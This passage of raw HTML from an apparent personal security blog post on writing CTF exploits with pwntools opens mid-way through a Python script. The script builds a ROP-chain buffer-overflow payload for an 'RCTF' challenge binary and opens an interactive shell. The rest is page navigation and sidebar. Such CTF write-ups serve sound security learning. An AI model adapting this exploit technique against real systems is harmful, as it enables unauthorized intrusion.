class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(check)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recv(<span class="number">0x1b</span>)</span><br><span class="line">log.info(<span class="string">&quot;recv:&quot;</span> + p.recv(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;R&quot;</span> * buflen</span><br><span class="line">payload += p64(ppppr)</span><br><span class="line">payload += p64(ppppppr)</span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = bss+<span class="number">0x8</span></span><br><span class="line">r13 = bss</span><br><span class="line">r14 = bss</span><br><span class="line">r15 = bss</span><br><span class="line">ret = mmmcall</span><br><span class="line">payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)</span><br><span class="line">ret = main</span><br><span class="line">payload += p64(padding) * <span class="number">7</span> + p64(ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io">qianmu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://qianmuoy.github.io/2024/03/09/Pwntools/">https://qianmuoy.github.io/2024/03/09/Pwntools/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/09/%E7%AA%81%E7%A0%B4GS/" title="突破GS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">突破GS</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/" title="获取系统信息"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">获取系统信息</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">qianmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/QianMuOY"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Epwntools%E7%BC%96%E5%86%99pwn%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">基于pwntools编写pwn代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pwntools%E5%AE%9E%E6%88%98CTF%E9%A2%98%E7%9B%AE"><span class="toc-number">1.2.</span> <span class="toc-text">使用pwntools实战CTF题目</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/APC%E6%B3%A8%E5%85%A5/" title="APC注入">APC注入</a><time datetime="2024-03-09T12:40:40.000Z" title="Created 2024-03-09 20:40:40">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/" title="使用内核内存">使用内核内存</a><time datetime="2024-03-09T12:39:58.000Z" title="Created 2024-03-09 20:39:58">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/" title="使用Lookaside内存">使用Lookaside内存</a><time datetime="2024-03-09T12:39:17.000Z" title="Created 2024-03-09 20:39:17">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/" title="内核解析拦截DLL设置">内核解析拦截DLL设置</a><time datetime="2024-03-09T12:38:13.000Z" title="Created 2024-03-09 20:38:13">2024-03-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/" title="突破SafeSEH">突破SafeSEH</a><time datetime="2024-03-09T12:37:05.000Z" title="Created 2024-03-09 20:37:05">2024-03-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By qianmu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="https://www.liuzehe.top/upload/bkjs/yinghua.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":120,"height":260},"mobile":{"show":"flase"},"log":false});</script></body></html>
